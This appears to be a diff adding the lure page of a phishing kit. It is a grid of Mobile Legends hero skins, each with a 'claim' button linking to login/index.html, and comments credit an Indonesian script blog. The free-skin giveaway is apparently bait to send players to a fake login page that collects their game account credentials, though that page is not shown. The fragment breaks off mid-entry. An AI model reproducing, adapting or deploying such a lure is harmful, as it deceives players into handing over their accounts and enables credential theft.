+	    <ul id="movieposters">	
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+<li>
+				<img src="https://s7d1.turboimg.net/t1/39176394_3658342.png" alt="" />
+				<div class="movieinfo">
+					<h3>NATALIA</h3>
+					<p>Glass Blade</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39176390_6033125.png" alt="" />
+				<div class="movieinfo">
+					<h3>NANA</h3>
+					<p>Wind Fairy</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39176393_327893.png" alt="" />
+				<div class="movieinfo">
+					<h3>LUNOX</h3>
+					<p>Bloody Mary</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+<li>
+				<img src="https://s7d1.turboimg.net/t1/39176389_6814763.png" alt="" />
+				<div class="movieinfo">
+					<h3>CHOU</h3>
+					<p>Furious Tiger</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39176392_8678583.png" alt="" />
+				<div class="movieinfo">
+					<h3>CYCLOPS</h3>
+					<p>Deep See Rescuer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39176391_8988039.png" alt="" />
+				<div class="movieinfo">
+					<h3>ROGER</h3>
+					<p>Phantom Pirate</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<li>
+				<img src="https://s7d5.turboimg.net/t1/39679359_Funny.png" alt="" />
+				<div class="movieinfo">
+					<h3>FANNY</h3>
+					<p>Royal Cavalry</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d5.turboimg.net/t1/39679360_Gatot.png" alt="" />
+				<div class="movieinfo">
+					<h3>GATOT</h3>
+					<p>Sentinel</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d5.turboimg.net/t1/39679361_haya.png" alt="" />
+				<div class="movieinfo">
+					<h3>HAYABUSA</h3>
+					<p>Experiment 21</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<li>
+				<img src="https://s7d5.turboimg.net/t1/39679362_InstaSave-picsayirit.png" alt="" />
+				<div class="movieinfo">
+					<h3>IRITHEL</h3>
+					<p>Sagittarius</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d5.turboimg.net/t1/39679363_2338043.png" alt="" />
+				<div class="movieinfo">
+					<h3>PHARSA</h3>
+					<p>Indigo Aviatrix</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d5.turboimg.net/t1/39679364_tigreal-picsay.png" alt="" />
+				<div class="movieinfo">
+					<h3>TIGREAL</h3>
+					<p>Wyrmslayer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<li>
+				<img src="https://s7d1.turboimg.net/t1/39345662_InstaSave-picsay4.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>THAMUZ</h3>
+					<p>Lord Of Wraith</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39345659_InstaSave-picsay1.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>GUSION</h3>
+					<p>Cyber Ops</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39345660_InstaSave-picsay2.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>GROCK</h3>
+					<p>Castle Guard</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+<li>
+				<img src="https://s7d1.turboimg.net/t1/39422896_InstaSave-picsaydhhshshshs.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>HANABI</h3>
+					<p>VIPER</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39422898_InstaSave-picsayfjdjdj.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>MARTIS</h3>
+					<p>God Of The</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39422897_InstaSave-picsayxhxh.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>BALMOND</h3>
+					<p>Celestial General</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+
+
+
+<li>
+				<img src="https://s7d8.turboimg.net/t1/39515608_123-picsay.png" alt="" />
+				<div class="movieinfo">
+					<h3>KAGURA</h3>
+					<p>Soryu Maiden</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d8.turboimg.net/t1/39515609_1234-picsay.png" alt="" />
+				<div class="movieinfo">
+					<h3>CLAUDE</h3>
+					<p>Plunderous Pirate</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d8.turboimg.net/t1/39515611_12345-picsay.png" alt="" />
+				<div class="movieinfo">
+					<h3>HARLEY</h3>
+					<p>Great Inventor</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+	        
+	        
+	        
+	        <li>
+				<img src="https://s7d8.turboimg.net/t1/39515615_5455529.png" alt="" />
+				<div class="movieinfo">
+					<h3>NATALIA</h3>
+					<p>Midnight Raven</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+				<img src="https://s7d8.turboimg.net/t1/39515612_5937038.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALICE</h3>
+					<p>Divine Owl</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d8.turboimg.net/t1/39515610_12345.png" alt="" />
+				<div class="movieinfo">
+					<h3>KARRIE</h3>
+					<p>Jester</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+	        
+	        <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+
+
+
+<li>
+				<img src="https://s7d1.turboimg.net/t1/39345661_InstaSave-picsay3.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>JOHNSON</h3>
+					<p>Jeepney Racer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39345658_InstaSave-picsay.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>AKAI</h3>
+					<p>Imperial Assassin</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39345667_InstaSave-picsay5.jpg" alt="" />
+				<div class="movieinfo">
+					<h3>MINOTAUR</h3>
+					<p>Sacred Hammer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+
+
+
+
+<li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+				<img src="https://s7d1.turboimg.net/t1/39230365_8123072.png" alt="" />
+				<div class="movieinfo">
+					<h3>LEOMORD</h3>
+					<p>Phantom Knight</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39230362_9910819.png" alt="" />
+				<div class="movieinfo">
+					<h3>SUN</h3>
+					<p>Street Legend</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39230359_2100844.png" alt="" />
+				<div class="movieinfo">
+					<h3>CLINT</h3>
+					<p>Badminton Champion</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+	<li>
+				<img src="https://s7d1.turboimg.net/t1/39079324_3609116.png" alt="" />
+				<div class="movieinfo">
+					<h3>URANUS</h3>
+					<p>Mech Protector</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/39079322_9754877.png" alt="" />
+				<div class="movieinfo">
+					<h3>VALE</h3>
+					<p>Carulean Winds</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+						<li>
+				<img src="https://s7d1.turboimg.net/t1/39079321_698117.png" alt="" />
+				<div class="movieinfo">
+					<h3>HYLOS</h3>
+					<p>Phantom Seer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<li>
+				<img src="https://s7d1.turboimg.net/t1/38943042_4166577.png" alt="" />
+				<div class="movieinfo">
+					<h3>BALMOND</h3>
+					<p>Savage Pointguard</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38942969_4672276.png" alt="" />
+				<div class="movieinfo">
+					<h3>LANCELOT</h3>
+					<p>Daek Earl</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38943009_5321402.png" alt="" />
+				<div class="movieinfo">
+					<h3>ODETTE</h3>
+					<p>Butterfly Goddess</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+
+
+<li><!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+				<img src="https://s7d1.turboimg.net/t1/38799572_8858940.png" alt="" />
+				<div class="movieinfo">
+					<h3>LAYLA</h3>
+					<p>Classic Malefic Gunner</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38799575_3388833.png" alt="" />
+				<div class="movieinfo">
+					<h3>KAJA</h3>
+					<p>Kaminari</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38735975_1157615.png" alt="" />
+				<div class="movieinfo">
+					<h3>HELCURT</h3>
+					<p>IceScythe</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+	    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+	    
+	<li>
+				<img src="https://s7d1.turboimg.net/t1/38772412_324238.png" alt="" />
+				<div class="movieinfo">
+					<h3>ANGELA</h3>
+					<p>China Doll</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38772413_8946135.png" alt="" />
+				<div class="movieinfo">
+					<h3>HILDA</h3>
+					<p>Sacred Guard</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38772414_148038.png" alt="" />
+				<div class="movieinfo">
+					<h3>VALIR</h3>
+					<p>Shikigami Summoner</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	  
+	    
+	    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+	    
+<li>
+				<img src="https://s7d1.turboimg.net/t1/38772415_7678992.png" alt="" />
+				<div class="movieinfo">
+					<h3>MIYA</h3>
+					<p>Suzuhime</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38772416_4118666.png" alt="" />
+				<div class="movieinfo">
+					<h3>GORD</h3>
+					<p>Professor Of hell</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38772417_9369685.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALDOUS</h3>
+					<p>Red Mantle</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+	    
+	          	    	    	        	  
+	    <!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+
+<li>
+				<img src="https://s7d1.turboimg.net/t/38729945_21.png" alt="" />
+				<div class="movieinfo">
+					<h3>FRANCO</h3>
+					<p>Locomotive</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729946_20.png" alt="" />
+				<div class="movieinfo">
+					<h3>JEWHEAD</h3>
+					<p>Space Explorer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729947_23.png" alt="" />
+				<div class="movieinfo">
+					<h3>KAJA</h3>
+					<p>Commandment</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+
+<li>
+				<img src="https://s7d1.turboimg.net/t/38729948_8209110.png" alt="" />
+				<div class="movieinfo">
+					<h3>HARLEY</h3>
+					<p>Referee</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729949_7130098.png" alt="" />
+				<div class="movieinfo">
+					<h3>BRUNO</h3>
+					<p>Street Football</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729950_25.png" alt="" />
+				<div class="movieinfo">
+					<h3>LASLEY</h3>
+					<p>Cheergunner</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+<!-- https://ensikology.blogspot.com/ - Kunjungi Blog Kami Untuk Mendapatkan Update Script Lainnya -->
+<li>
+				<img src="https://s7d1.turboimg.net/t/38729951_1950281.png" alt="" />
+				<div class="movieinfo">
+					<h3>RAFELAH</h3>
+					<p>S.A.B.E.R Savior</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729952_5294499.png" alt="" />
+				<div class="movieinfo">
+					<h3>KARINA</h3>
+					<p>Doom Duelist</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t/38729953_5074580.png" alt="" />
+				<div class="movieinfo">
+					<h3>AKAI</h3>
+					<p>Akazonae Samurai</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+	    
+	    
+<li>
+				<img src="https://s7d1.turboimg.net/t1/38729955_4566234.png" alt="" />
+				<div class="movieinfo">
+					<h3>FREYA</h3>
+					<p>Gladiator</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729956_2504328.png" alt="" />
+				<div class="movieinfo">
+					<h3>LAYLA</h3>
+					<p>Blue Spectre</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729957_2599391.png" alt="" />
+				<div class="movieinfo">
+					<h3>IRITHEL</h3>
+					<p>Hellfire</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">		    	    	    
+	    
+	    
+
+<li>
+				<img src="https://s7d1.turboimg.net/t1/38729964_1514080.png" alt="" />
+				<div class="movieinfo">
+					<h3>URANUS</h3>
+					<p>Ancient Soul</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729959_3.png" alt="" />
+				<div class="movieinfo">
+					<h3>ZILONG</h3>
+					<p>Changbanpo Commander</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729960_2.png" alt="" />
+				<div class="movieinfo">
+					<h3>GUSION</h3>
+					<p>Hairstylist</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+
+
+
+
+<li>
+				<img src="https://s7d1.turboimg.net/t1/38729961_5.png" alt="" />
+				<div class="movieinfo">
+					<h3>SALENA</h3>
+					<p>Flame Witch</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729962_4.png" alt="" />
+				<div class="movieinfo">
+					<h3>CYCLOPS</h3>
+					<p>S.A.B.E.R  Exploder</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729963_6643311.png" alt="" />
+				<div class="movieinfo">
+					<h3>CHANG'E</h3>
+					<p>Moonstruck</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">	
+	    
+	    
+	    
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729966_1024720.png" alt="" />
+				<div class="movieinfo">
+					<h3>NANA</h3>
+					<p>ClockWork Maid</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729967_8745629.png" alt="" />
+				<div class="movieinfo">
+					<h3>MARTIS</h3>
+					<p>Searing Maw</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729968_6186728.png" alt="" />
+				<div class="movieinfo">
+					<h3>FREYA</h3>
+					<p>Dark Rose</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    <ul id="movieposters">
+	    
+	    
+	    <li>
+				<img src="https://s7d1.turboimg.net/t1/38729969_1259195.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALUCARD</h3>
+					<p>Romantic Fantasy</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729971_2074741.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALUCARD</h3>
+					<p>Child Of The Fall</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729973_8018007.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALUCARD</h3>
+					<p>Viscount</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38729975_8628035.png" alt="" />
+				<div class="movieinfo">
+					<h3>FREYA</h3>
+					<p>Beach Sweaetheart</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729976_6027010.png" alt="" />
+				<div class="movieinfo">
+					<h3>FREYA</h3>
+					<p>War Angel</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729977_9601407.png" alt="" />
+				<div class="movieinfo">
+					<h3>FREYA</h3>
+					<p>Dragon Hunter</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38729978_8204540.png" alt="" />
+				<div class="movieinfo">
+					<h3>MIYA</h3>
+					<p>Sweet Fantasy</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38644729_1566982.png" alt="" />
+				<div class="movieinfo">
+					<h3>MIYA</h3>
+					<p>Christmas Carnival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729979_9374730.png" alt="" />
+				<div class="movieinfo">
+					<h3>MIYA</h3>
+					<p>Captain Thorns</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38729980_3391896.png" alt="" />
+				<div class="movieinfo">
+					<h3>ZILONG</h3>
+					<p>Blazing Lancer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729981_468042.png" alt="" />
+				<div class="movieinfo">
+					<h3>ZILONG</h3>
+					<p>Glorious General</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729984_1838408.png" alt="" />
+				<div class="movieinfo">
+					<h3>ZILONG</h3>
+					<p>Eastern Warrior</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38729985_7789256.png" alt="" />
+				<div class="movieinfo">
+					<h3>EUDORA</h3>
+					<p>Christmas Carnival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38729986_84223.png" alt="" />
+				<div class="movieinfo">
+					<h3>EUDORA</h3>
+					<p>Emarald Enchantress</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731431_3865934.png" alt="" />
+				<div class="movieinfo">
+					<h3>EUDORA</h3>
+					<p>Vivo Selfi Goddess</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731432_4325650.png" alt="" />
+				<div class="movieinfo">
+					<h3>HILDA</h3>
+					<p>Flower Of The Wastes</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731433_4600533.png" alt="" />
+				<div class="movieinfo">
+					<h3>ALUCARD</h3>
+					<p>Fiery Inferno</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731434_7126162.png" alt="" />
+				<div class="movieinfo">
+					<h3>FANNY</h3>
+					<p>Punk Princess</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    		    	
+	    	    	
+	    	
+	   
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731435_8535147.png" alt="" />
+				<div class="movieinfo">
+					<h3>CLINT</h3>
+					<p>Guns And Roses</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731436_7588085.png" alt="" />
+				<div class="movieinfo">
+					<h3>NANA</h3>
+					<p>Slumber Party</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731437_3953143.png" alt="" />
+				<div class="movieinfo">
+					<h3>LAYLA</h3>
+					<p>Cannon And Roses</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731453_8144856.png" alt="" />
+				<div class="movieinfo">
+					<h3>LASLEY</h3>
+					<p>Royan Musketeer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731455_3551974.png" alt="" />
+				<div class="movieinfo">
+					<h3>LANCELOT</h3>
+					<p>Royal Matador</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731454_8544155.png" alt="" />
+				<div class="movieinfo">
+					<h3>HARLEY</h3>
+					<p>Royal Megister</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731456_6949279.png" alt="" />
+				<div class="movieinfo">
+					<h3>BRUNO</h3>
+					<p>Best Dj</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731457_7721511.png" alt="" />
+				<div class="movieinfo">
+					<h3>SUN</h3>
+					<p>Rock Star</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731458_1920349.png" alt="" />
+				<div class="movieinfo">
+					<h3>CLINT</h3>
+					<p>Rock And Roll</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731459_1294068.png" alt="" />
+				<div class="movieinfo">
+					<h3>BALMOD</h3>
+					<p>Savage Hunter</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731460_3005741.png" alt="" />
+				<div class="movieinfo">
+					<h3>HYLOS</h3>
+					<p>Abyssal Shaman</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731461_6370312.png" alt="" />
+				<div class="movieinfo">
+					<h3>TIGREAL</h3>
+					<p>Fallen Guard</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731466_5755873.png" alt="" />
+				<div class="movieinfo">
+					<h3>ODETTE</h3>
+					<p>Christmas Carnival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731475_5115222.png" alt="" />
+				<div class="movieinfo">
+					<h3>LANCELOT</h3>
+					<p>Christmas Carnival</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731476_5609234.png" alt="" />
+				<div class="movieinfo">
+					<h3>RUBY</h3>
+					<p>Hidden Orchid Butterfly</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731477_1725774.png" alt="" />
+				<div class="movieinfo">
+					<h3>LAPU-LAPU</h3>
+					<p>Imperial Champion</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731478_8670560.png" alt="" />
+				<div class="movieinfo">
+					<h3>Aurora</h3>
+					<p>Foxy Lady</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+			<li>
+				<img src="https://s7d1.turboimg.net/t1/38731480_8101868.png" alt="" />
+				<div class="movieinfo">
+					<h3>NATALIA</h3>
+					<p>Phantom Dancer</p>
+					<a href="login/index.html" title="claim">claim</a>
+				</div>
+			</li>
+		</ul>	    
+	    	<ul id="movieposters">
+	    	
+	    	
+	    	
+	    	<li>
+				<img src="https://s7d1.turboimg.net/t1/38731481_1997878.png" alt="" />
+				<div class="movieinfo">
+					<h3>ARGUS</h3>
